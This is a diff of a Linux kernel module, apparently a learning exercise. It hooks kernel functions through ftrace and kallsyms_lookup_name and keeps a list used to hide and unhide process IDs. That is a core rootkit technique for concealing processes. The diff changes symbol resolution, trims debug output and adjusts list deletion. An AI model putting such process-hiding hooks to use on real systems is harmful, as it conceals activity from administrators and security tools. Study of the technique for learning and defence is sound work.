@@ -22,22 +22,16 @@ struct ftrace_hook {
 
 static int hook_resolve_addr(struct ftrace_hook *hook)
 {
-    hook->address = &find_ge_pid;
-#if 0
+
+    hook->address = kallsyms_lookup_name(hook->name);
+
     if (!hook->address) {
         printk("unresolved symbol: %s\n", hook->name);
         return -ENOENT;
-    } else {
-        printk("resolved symbol: %s %p\n", hook->name, *((unsigned long *) hook->address));
-
-        printk("resolved symbol: schedule:%p\n", kallsyms_lookup_name("schedule"));
     }
-#endif
-        printk("resolved symbol: %s %p\n", hook->name, hook->address);
-        printk("kallsym symbol: %p\n", kallsyms_lookup_name(hook->name));
-    *((unsigned long *) hook->orig) = &find_ge_pid;
-//    *((unsigned long *) hook->orig) = 0xffff8000100dc310;
-    //hook->address = hook->orig;
+
+    printk("kallsym symbol: %p\n", (void *)kallsyms_lookup_name(hook->name));
+      *((unsigned long *) hook->orig) = hook->address;
     return 0;
 }
 
@@ -78,7 +72,6 @@ static int hook_install(struct ftrace_hook *hook)
     }
 #endif
 
-
     err = register_ftrace_function(&hook->ops);
     if (err) {
         printk("register_ftrace_function() failed: %d\n", err);
@@ -116,7 +109,7 @@ static struct ftrace_hook hook;
 
 static bool is_hidden_proc(pid_t pid)
 {
-    pid_node_t *proc, *tmp_proc;
+    pid_node_t *proc;
     //AAA 
     list_for_each_entry(proc, &hidden_proc, list_node) {
         if (proc->id == pid)
@@ -157,7 +150,7 @@ static int unhide_process(pid_t pid)
     //BBB 
     list_for_each_entry_safe(proc, tmp_proc, &hidden_proc, list_node) {
         //DDD;
-	list_del_init(&proc->list_node);
+	list_del(&proc->list_node);
         kfree(proc);
     }
     return SUCCESS;
